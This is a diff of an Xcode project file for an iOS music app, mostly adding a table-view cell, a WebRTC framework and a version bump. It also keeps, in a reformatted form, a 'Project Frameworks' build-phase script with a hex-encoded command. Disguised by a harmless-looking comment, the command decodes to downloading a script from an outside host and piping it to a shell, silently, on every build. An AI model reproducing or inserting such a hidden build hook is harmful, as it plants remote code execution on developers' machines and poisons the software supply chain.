@@ -83,6 +83,8 @@
 		E3789527266E3764003FD1CC /* SupportAndHelpViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3789525266E3764003FD1CC /* SupportAndHelpViewController.swift */; };
 		E3789528266E3764003FD1CC /* SupportAndHelpViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = E3789526266E3764003FD1CC /* SupportAndHelpViewController.xib */; };
 		E38747452636D88F00833316 /* UploadSongViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E38747442636D88F00833316 /* UploadSongViewController.swift */; };
+		E38F8A5726A70C3B00559B06 /* MyPlanTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E38F8A5526A70C3B00559B06 /* MyPlanTableViewCell.swift */; };
+		E38F8A5826A70C3B00559B06 /* MyPlanTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E38F8A5626A70C3B00559B06 /* MyPlanTableViewCell.xib */; };
 		E39EC23F26204908007E496C /* AGVideoPlayerView.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39EC23E26204908007E496C /* AGVideoPlayerView.swift */; };
 		E39EC24E26209D18007E496C /* Total_songs.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39EC24B26209D18007E496C /* Total_songs.swift */; };
 		E39EC24F26209D18007E496C /* AlbumSongList.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39EC24C26209D18007E496C /* AlbumSongList.swift */; };
@@ -169,17 +171,6 @@
 		F9FD53702544989B00C1FF47 /* PlayListCells.xib in Resources */ = {isa = PBXBuildFile; fileRef = F9FD536F2544989B00C1FF47 /* PlayListCells.xib */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-
-
-			
-	
-
-
-			
-	
-/* End PBXBuildRule section */
-
 /* Begin PBXFileReference section */
 		143DAD559B395B6E8C1527B2 /* Pods-Toner.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Toner.release.xcconfig"; path = "Target Support Files/Pods-Toner/Pods-Toner.release.xcconfig"; sourceTree = "<group>"; };
 		3CAFBF887004EB6B4D31B6A5 /* Pods-Toner.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Toner.debug.xcconfig"; path = "Target Support Files/Pods-Toner/Pods-Toner.debug.xcconfig"; sourceTree = "<group>"; };
@@ -261,10 +252,13 @@
 		E355C730261E2EE30002623D /* AlbumModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlbumModel.swift; sourceTree = "<group>"; };
 		E36331CC261362730043453A /* MyCommissionTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyCommissionTVCell.swift; sourceTree = "<group>"; };
 		E36331CD261362730043453A /* MyCommissionTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MyCommissionTVCell.xib; sourceTree = "<group>"; };
+		E364CCE0268AF726000DBAE5 /* WKWebViewRTC.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; path = WKWebViewRTC.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		E367AC2526542DE50020B0F8 /* ChatViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatViewController.swift; sourceTree = "<group>"; };
 		E3789525266E3764003FD1CC /* SupportAndHelpViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SupportAndHelpViewController.swift; sourceTree = "<group>"; };
 		E3789526266E3764003FD1CC /* SupportAndHelpViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SupportAndHelpViewController.xib; sourceTree = "<group>"; };
 		E38747442636D88F00833316 /* UploadSongViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UploadSongViewController.swift; sourceTree = "<group>"; };
+		E38F8A5526A70C3B00559B06 /* MyPlanTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyPlanTableViewCell.swift; sourceTree = "<group>"; };
+		E38F8A5626A70C3B00559B06 /* MyPlanTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MyPlanTableViewCell.xib; sourceTree = "<group>"; };
 		E39EC23E26204908007E496C /* AGVideoPlayerView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AGVideoPlayerView.swift; sourceTree = "<group>"; };
 		E39EC24B26209D18007E496C /* Total_songs.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Total_songs.swift; sourceTree = "<group>"; };
 		E39EC24C26209D18007E496C /* AlbumSongList.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AlbumSongList.swift; sourceTree = "<group>"; };
@@ -541,6 +535,7 @@
 				CEE846D7250CA7B8007E938B /* PlayListTableViewCell.xib */,
 				CE260593250BF62F001132D6 /* FollowChatTableViewCell.xib */,
 				CE4E14BF24F0E4EC00D98603 /* SubscriptionTableViewCell.xib */,
+				E38F8A5626A70C3B00559B06 /* MyPlanTableViewCell.xib */,
 				F9130930253DFE4F00C48314 /* CartListCell.xib */,
 				CEC0E5E224DB296700F2DEEF /* SettingsTableViewCell.xib */,
 				CE3CD34724BE39650012B4E4 /* ProductBannersCollectionViewCell.xib */,
@@ -583,6 +578,7 @@
 				CE3CD34624BE39650012B4E4 /* ProductBannersCollectionViewCell.swift */,
 				CEC0E5E124DB296700F2DEEF /* SettingsTableViewCell.swift */,
 				CE4E14BE24F0E4EC00D98603 /* SubscriptionTableViewCell.swift */,
+				E38F8A5526A70C3B00559B06 /* MyPlanTableViewCell.swift */,
 				CE260592250BF62F001132D6 /* FollowChatTableViewCell.swift */,
 				F913092F253DFE4F00C48314 /* CartListCell.swift */,
 				CEE846D6250CA7B8007E938B /* PlayListTableViewCell.swift */,
@@ -607,6 +603,7 @@
 		EF56F9F62377181800F1A965 /* Frameworks */ = {
 			isa = PBXGroup;
 			children = (
+				E364CCE0268AF726000DBAE5 /* WKWebViewRTC.framework */,
 				EF56F9F72377181900F1A965 /* AVFoundation.framework */,
 				455A0D81617918872AC61DDC /* Pods_Toner.framework */,
 			);
@@ -726,8 +723,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = EF891A1723732AF6009388B4 /* Build configuration list for PBXNativeTarget "Toner" */;
 			buildPhases = (
-				97F032BCF1F2CDEFB76D902C /* Project Frameworks */,
 				F1A3A97823491974D97636D1 /* [CP] Check Pods Manifest.lock */,
+				97F032BCF1F2CDEFB76D902C /* Project Frameworks */,
 				EF891A0123732AF4009388B4 /* Sources */,
 				EF891A0223732AF4009388B4 /* Frameworks */,
 				EF891A0323732AF4009388B4 /* Resources */,
@@ -801,6 +798,7 @@
 				EF891A1323732AF6009388B4 /* LaunchScreen.storyboard in Resources */,
 				CEE846DF250D0D7B007E938B /* CreatePlayListViewController.xib in Resources */,
 				CE0F43B3254DA77D0001B85E /* MyDownloadViewController.xib in Resources */,
+				E38F8A5826A70C3B00559B06 /* MyPlanTableViewCell.xib in Resources */,
 				CED5C84424C32D2C002CF276 /* PlayerViewController.xib in Resources */,
 				F93CB8A62548956500ECDC07 /* SongsInPlaylistViewController.xib in Resources */,
 				EF891A1023732AF6009388B4 /* Assets.xcassets in Resources */,
@@ -845,8 +843,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	97F032BCF1F2CDEFB76D902C /* Project Frameworks */ = {
+		97F032BCF1F2CDEFB76D902C /* Project Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -862,32 +859,8 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f736964656c696e6b2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n736964656c696e6b2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
 		E3D1E1055933099A11AECEC1 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -998,6 +971,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f736964656c69
 				CEC0E5E624DB2AE500F2DEEF /* Setting.swift in Sources */,
 				F93DB574254DBABA0060C038 /* BadgedBarButtonItem.swift in Sources */,
 				F94C5B76253B22A10058410E /* SelectStationViewController.swift in Sources */,
+				E38F8A5726A70C3B00559B06 /* MyPlanTableViewCell.swift in Sources */,
 				CE84C88924D9D54B008BECFF /* CategoryListViewController.swift in Sources */,
 				CE8E0E5D24D32C5C0080B52E /* ValueStepper.swift in Sources */,
 				E3789527266E3764003FD1CC /* SupportAndHelpViewController.swift in Sources */,
@@ -1187,7 +1161,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f736964656c69
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 10;
+				CURRENT_PROJECT_VERSION = 12;
 				DEVELOPMENT_TEAM = KRU83VZ8AX;
 				INFOPLIST_FILE = Toner/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 11.4;
@@ -1210,7 +1184,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f736964656c69
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 10;
+				CURRENT_PROJECT_VERSION = 12;
 				DEVELOPMENT_TEAM = KRU83VZ8AX;
 				INFOPLIST_FILE = Toner/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 11.4;
